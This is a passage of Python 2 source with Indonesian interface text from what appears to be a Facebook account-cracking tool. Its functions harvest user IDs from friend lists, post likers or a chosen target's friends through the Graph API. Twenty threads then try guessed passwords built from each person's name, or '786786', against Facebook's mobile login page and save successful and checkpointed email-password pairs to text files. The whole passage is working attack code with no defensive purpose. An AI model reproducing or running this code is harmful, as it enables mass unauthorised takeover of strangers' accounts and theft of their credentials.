            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw
                oke = open('done/hindi.txt', 'a')
                oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw)
                oke.close()
                oks.append(em)
            elif 'checkpoint' in xo:
                print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw
                cek = open('done/hindi.txt', 'a')
                cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw)
                cek.close()
                cekpoint.append(em)
            else:
                pw2 = v['first_name'] + '12345'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw2
                    oke = open('done/hindi.txt', 'a')
                    oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw2)
                    oke.close()
                    oks.append(em)
                elif 'checkpoint' in xo:
                    print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw2
                    cek = open('done/hindi.txt', 'a')
                    cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw2)
                    cek.close()
                    cekpoint.append(em)
                else:
                    pw3 = v['first_name'] + '1234'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw3
                        oke = open('done/hindi.txt', 'a')
                        oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw3)
                        oke.close()
                        oks.append(em)
                    elif 'checkpoint' in xo:
                        print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw3
                        cek = open('done/hindi.txt', 'a')
                        cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw3)
                        cek.close()
                        cekpoint.append(em)
                    else:
                        pw4 = '786786'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw4
                            oke = open('done/hindi.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw4)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw4
                            cek = open('done/hindi.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw4)
                            cek.close()
                            cekpoint.append(em)
                        else:
                            pw5 = '786786'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw5
                            oke = open('done/hindi.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw5)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw5
                            cek = open('done/hindi.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw5)
                            cek.close()
                            cekpoint.append(em)
        except:
            pass
    p = ThreadPool(20)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSelesai ....'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;93mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;93m' + str(len(cekpoint))
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mCP file tersimpan : out/hindi.txt'
    print 47 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
    os.system('python2 KIYAY_.py')
def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Token invalid '
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
        os.system('clear')
        print logo
        print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        tez = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] ID Postingan : ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=5000&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        jalan('\r\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSukses Mengambil ID \x1b[0;97m...')
    except KeyError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] \x1b[0;97mID Postingan Salah !'
        raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
        menu()
    print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Total ID : ' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)
    print '\n\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m \x1b[1;41;97mUNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM !\x1b[0m'
    print '\x1b[1;97m \x1b[1;41;97mTIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK !\x1b[0m'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[0;97m%H:%M:%S')))
        sys.stdout.flush()
        em = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
            v = json.loads(an.text)
            pc = v['first_name'] + '123'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pc, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pc
                oke = open('done/like.txt', 'a')
                oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pc)
                oke.close()
                oks.append(em)
            elif 'checkpoint' in xo:
                print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pc
                cek = open('done/like.txt', 'a')
                cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pc)
                cek.close()
                cekpoint.append(em)
            else:
                pc2 = v['first_name'] + '12345'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pc2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pc2
                    oke = open('done/like.txt', 'a')
                    oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pc2)
                    oke.close()
                    oks.append(em)
                elif 'checkpoint' in xo:
                    print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pc2
                    cek = open('done/like.txt', 'a')
                    cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pc2)
                    cek.close()
                    cekpoint.append(em)
                else:
                    pc3 = v['first_name'] + '1234'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pc3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pc3
                        oke = open('done/like.txt', 'a')
                        oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pc3)
                        oke.close()
                        oks.append(em)
                    elif 'checkpoint' in xo:
                        print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pc3
                        cek = open('done/like.txt', 'a')
                        cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pc3)
                        cek.close()
                        cekpoint.append(em)
                    else:
                        pc4 = v['last_name'] + '123'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pc4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pc4
                            oke = open('done/like.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pc4)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pc4
                            cek = open('done/like.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pc4)
                            cek.close()
                            cekpoint.append(em)
        except:
            pass
    p = ThreadPool(20)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSelesai ....'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;93mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;93m' + str(len(cekpoint))
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mCP file tersimpan : out/like.txt'
    print 47 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
    os.system('python2 KIYAY_.py')
def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Token invalid '
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        menu()
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0;97m [\x1b[0;97m01\x1b[0;97m]\x1b[0;93m\x1b[0;97m Ambil ID dari Daftar Teman '
    print '\x1b[0;97m [\x1b[0;97m02\x1b[0;97m]\x1b[0;93m\x1b[0;97m Ambil ID dari Publik / Teman '
    print '\x1b[0;97m [\x1b[0;91m00\x1b[0;97m]\x1b[0;93m\x1b[0;97m Kembali '
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    dump_pilih()
def dump_pilih():
    cuih = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m ')
    if cuih == '':
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
        dump_pilih()
    elif cuih == '1' or cuih == '01':
        id_teman()
    elif cuih == '2' or cuih == '02':
        idfrom_teman()
    elif cuih == '0' or cuih == '00':
        menu()
    else:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Isi Yg Benar !'
        dump_pilih()
def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('clear')
        print logo
        print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mMengambil semua ID Teman \x1b[0;97m...')
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[0;97m[\x1b[0;93m' + str(len(idteman)) + '\x1b[0;97m]\x1b[0;97m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m' + a['id']
        bz.close()
        print '\r\x1b[0;97m[\x1b[0;92m\xe2\x9c\x93\x1b[0;97m] \x1b[0;97mSukses Mengambil ID \x1b[0;97m....'
        print '\r\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mTotal ID : %s' % len(idteman)
        done = raw_input('\r\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSimpan Nama File : ')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mFile tersimpan : \x1b[0;97mout/' + done
        print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        raw_input('\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
        menu()
    except IOError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Gagal membuat file'
        raw_input('\n\x1b[0;97m[ \x1b[0;91m Back \x1b[0;97m]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Terhenti ! '
        raw_input('\n\x1b[0;97m[ \x1b[0;91m Back \x1b[0;97m]')
        menu()
    except KeyError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Gagal !'
        raw_input('\n\x1b[0;97m[ \x1b[0;91m Back \x1b[0;97m]')
        menu()
    except OSError:
        print '\x1b[0;97m[\x1b[0;95m!\x1b[0;97m]\x1b[0;97m File anda tidak tersimpan !'
        raw_input('\n\x1b[0;97m[ \x1b[0;91m Back \x1b[0;97m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Tidak ada koneksi !'
        keluar()
def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m]\x1b[0;91m Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('clear')
        print logo
        print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        idt = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mNama Akun      : ' + op['name']
        except KeyError:
            print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] ID Publik Tidak Ada !'
            raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
            dump()
        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mMengambil Semua ID ...')
        print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[0;97m[ \x1b[0;97m' + str(len(idfromteman)) + '\x1b[0;97m ]\x1b[0;91m \xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m ' + a['id']
        bz.close()
        print '\r\x1b[0;97m[\x1b[0;92m \xe2\x9c\x93 \x1b[0;97m]\x1b[0;97m Sukses Mengambil ID \x1b[0;97m....'
        print '\r\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Total ID : %s' % len(idfromteman)
